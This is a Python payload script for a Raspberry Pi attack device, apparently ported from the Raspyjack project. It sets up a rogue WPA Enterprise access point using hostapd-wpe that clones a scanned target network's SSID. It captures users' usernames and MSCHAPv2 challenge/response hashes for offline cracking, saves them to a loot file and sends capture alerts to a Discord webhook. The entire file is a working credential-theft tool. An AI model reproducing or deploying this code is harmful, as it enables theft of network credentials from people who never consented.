#!/usr/bin/env python3
"""
KTOx payload - WPA Enterprise Downgrade
==========================================
Ported from Raspyjack by 7h30th3r0n3.
Sets up a rogue WPA Enterprise AP that accepts any credentials,
capturing usernames and NTLM/MSCHAPv2 hashes for offline cracking.
Uses hostapd-wpe (wireless pwnage edition).

Features:
- Creates rogue WPA Enterprise AP matching a target SSID
- Captures MSCHAPv2 challenge/response pairs
- Logs credentials to loot/WPAEnterprise/
- Displays captured credentials on LCD in real time
- Discord webhook notification on capture

Controls:
- OK: start rogue AP
- KEY3: stop and exit
"""
import sys, os, time, subprocess, threading, re
from datetime import datetime

if os.path.isdir('/root/KTOx') and '/root/KTOx' not in sys.path:
    sys.path.insert(0, '/root/KTOx')
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))

try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False

PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
        "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}
LOOT_DIR  = "/root/KTOx/loot/WPAEnterprise"
WEBHOOK_F = "/root/KTOx/discord_webhook.txt"
W, H = 128, 128
os.makedirs(LOOT_DIR, exist_ok=True)
_stop = threading.Event()


def run(cmd, timeout=15):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=timeout)
        return r.stdout.strip()
    except Exception:
        return ""


def get_webhook():
    try:
        return open(WEBHOOK_F).read().strip()
    except: return ""


def notify(msg):
    url = get_webhook()
    if not url: return
    try:
        import requests
        requests.post(url, json={"content": f"**[KTOx WPA-Ent]** {msg}"}, timeout=5)
    except: pass


def font(size=8):
    try:
        return ImageFont.truetype(
            "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", size)
    except:
        return ImageFont.load_default()


class Display:
    def __init__(self):
        self.lcd = None
        if HAS_HW:
            try:
                GPIO.setmode(GPIO.BCM)
                GPIO.setwarnings(False)
                for pin in PINS.values():
                    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
                self.lcd = LCD_1in44.LCD()
                self.lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
                self.lcd.LCD_Clear()
            except Exception as e:
                print(f"LCD: {e}")

    def show(self, title, lines, col="#00ff88"):
        if not HAS_HW or "Image" not in globals():
            print(f"[{title}]", lines)
            return
        img  = Image.new("RGB", (W, H), (10, 0, 0))
        draw = ImageDraw.Draw(img)
        draw.rectangle((0, 0, W, 14), fill="#880000")
        draw.text((3, 2), title[:20], fill=(242, 243, 244), font=font(9))
        y = 18
        for line in (lines or []):
            draw.text((3, y), str(line)[:21], fill=col, font=font(8))
            y += 11
            if y > H - 8: break
        if self.lcd:
            try: self.lcd.LCD_ShowImage(img, 0, 0)
            except: pass
        else:
            print(f"[{title}]", lines)

    def btn(self):
        if not HAS_HW: return None
        for name, pin in PINS.items():
            try:
                if GPIO.input(pin) == GPIO.LOW:
                    return name
            except: pass
        return None


HOSTAPD_WPE_CONF = """
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={ch}
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/ca.pem
server_cert=/etc/hostapd-wpe/server.pem
private_key=/etc/hostapd-wpe/server.key
dh_file=/etc/hostapd-wpe/dh
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
"""


def scan_enterprise_aps(iface, disp):
    disp.show("SCANNING", ["Looking for WPA-Ent", "APs... ~10s"])
    out = run(f"iw dev {iface} scan 2>/dev/null", timeout=15)
    aps = []
    bssid = ch = essid = auth = None
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("BSS "):
            if bssid and essid:
                aps.append((bssid, ch or "6", essid, auth or ""))
            bssid = line.split()[1].split("(")[0].strip()
            ch = essid = auth = None
        elif "primary channel:" in line:
            ch = line.split(":")[-1].strip()
        elif "SSID:" in line:
            essid = line.split("SSID:")[-1].strip()
        elif "EAP" in line or "802.1X" in line:
            auth = "WPA-ENT"
    if bssid and essid:
        aps.append((bssid, ch or "6", essid, auth or ""))
    return [(b, c, e, a) for b, c, e, a in aps if a == "WPA-ENT"] or aps


def watch_log(log_path, disp, captured):
    while not _stop.is_set():
        try:
            if os.path.exists(log_path):
                with open(log_path) as f:
                    content = f.read()
                # Parse hostapd-wpe log for credentials
                for m in re.finditer(
                    r"username:\s*(\S+).*?challenge:\s*(\S+).*?response:\s*(\S+)",
                    content, re.DOTALL):
                    user = m.group(1)
                    chal = m.group(2)
                    resp = m.group(3)
                    key  = f"{user}:{chal}:{resp}"
                    if key not in captured:
                        captured.add(key)
                        ts  = datetime.now().strftime("%H:%M:%S")
                        entry = f"{ts} {user} {chal[:8]}:{resp[:8]}"
                        disp.show("CAPTURED!", [
                            f"USER: {user[:18]}",
                            f"CHAL: {chal[:18]}",
                            f"RESP: {resp[:18]}",
                            "",
                            "KEY3=stop",
                        ], col="#ffff00")
                        with open(f"{LOOT_DIR}/creds.txt", "a") as lf:
                            lf.write(f"Username: {user}\n"
                                     f"Challenge: {chal}\n"
                                     f"Response: {resp}\n"
                                     f"Time: {datetime.now().isoformat()}\n\n")
                        notify(f"WPA-Ent cred captured: {user}")
        except Exception:
            pass
        time.sleep(2)


def main():
    disp  = Display()
    iface = "wlan0"

    # Check hostapd-wpe installed
    if not run("which hostapd-wpe"):
        disp.show("MISSING DEP", [
            "hostapd-wpe not found",
            "",
            "Install with:",
            "apt install hostapd-wpe",
            "",
            "KEY3=exit"
        ], col="#ff4444")
        while disp.btn() != "KEY3":
            time.sleep(0.1)
        return

    aps = scan_enterprise_aps(iface, disp)

    # Input SSID manually if no WPA-ent APs found
    if not aps:
        disp.show("MANUAL SSID", [
            "No WPA-Ent APs",
            "Using: CorporateWifi",
            "",
            "OK=use default",
            "KEY3=exit",
        ])
        target_ssid = "CorporateWifi"
        target_ch   = "6"
        btn = None
        while btn not in ("OK", "KEY3"):
            btn = disp.btn()
            time.sleep(0.1)
        if btn == "KEY3":
            return
    else:
        cursor = 0
        while True:
            b, ch, essid, _ = aps[cursor]
            disp.show("SELECT TARGET", [
                f"> {essid[:18]}",
                f"  CH: {ch}",
                f"  {cursor+1}/{len(aps)}",
                "OK=select KEY3=exit",
            ])
            btn = None
            for _ in range(20):
                btn = disp.btn()
                if btn: break
                time.sleep(0.05)
            if btn == "UP":
                cursor = (cursor - 1) % len(aps)
                time.sleep(0.2)
            elif btn == "DOWN":
                cursor = (cursor + 1) % len(aps)
                time.sleep(0.2)
            elif btn == "KEY3":
                return
            elif btn == "OK":
                break
        target_ssid = aps[cursor][2]
        target_ch   = aps[cursor][1]

    # Write hostapd-wpe config
    conf_path = "/tmp/ktox_wpe.conf"
    log_path  = "/tmp/hostapd-wpe.log"
    with open(conf_path, "w") as f:
        f.write(HOSTAPD_WPE_CONF.format(
            iface=iface, ssid=target_ssid, ch=target_ch))

    disp.show("STARTING AP", [
        f"SSID: {target_ssid[:16]}",
        f"CH: {target_ch}",
        "Launching hostapd-wpe",
    ])

    run("airmon-ng check kill 2>/dev/null")
    proc = subprocess.Popen(
        f"hostapd-wpe {conf_path} 2>&1 | tee {log_path}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(3)
    disp.show("ROGUE AP UP", [
        f"SSID: {target_ssid[:16]}",
        "Waiting for clients",
        "",
        "KEY3=stop",
    ])

    _stop.clear()
    captured = set()
    watcher = threading.Thread(
        target=watch_log, args=(log_path, disp, captured), daemon=True)
    watcher.start()

    try:
        while disp.btn() != "KEY3":
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass
    finally:
        _stop.set()
        proc.terminate()
        watcher.join(timeout=3)
        disp.show("STOPPED", [
            f"Captured: {len(captured)}",
            f"Loot: {LOOT_DIR[-20:]}",
            "KEY3=exit"
        ])
        time.sleep(1)
        if HAS_HW:
            try: GPIO.cleanup()
            except: pass
        print("[WPAEnt] Exited.")


if __name__ == "__main__":
    main()
